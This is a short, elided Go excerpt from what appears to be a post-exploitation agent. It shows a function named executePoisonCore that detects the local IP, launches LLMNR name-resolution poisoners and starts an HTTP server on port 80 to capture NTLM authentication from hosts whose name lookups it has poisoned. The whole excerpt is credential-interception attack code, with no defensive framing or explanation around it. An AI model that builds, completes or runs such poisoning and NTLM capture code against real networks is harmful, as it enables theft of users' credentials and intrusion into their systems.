...
func executePoisonCore(task structs.Task) structs.CommandResult {
	...
	if responseIPStr == "" {
		...
		if err != nil {
			return errorf("detecting local IP: %v", err)
		}
		responseIPStr = ip
	}
	...
	// Start protocol-specific poisoners
	if protocols["llmnr"] {
		wg.Add(1)
		go func() {
			defer wg.Done()
	...
	// Start HTTP NTLM capture server to intercept authentication
	// after name resolution is poisoned
	wg.Add(1)
	go func() {
		defer wg.Done()
		if err := captureHTTPNTLM(ctx, ":80", &mu, result); err != nil {
			mu.Lock()
			result.Errors = append(result.Errors, fmt.Sprintf("HTTP-NTLM: %v", err))
			mu.Unlock()
		}
	}()
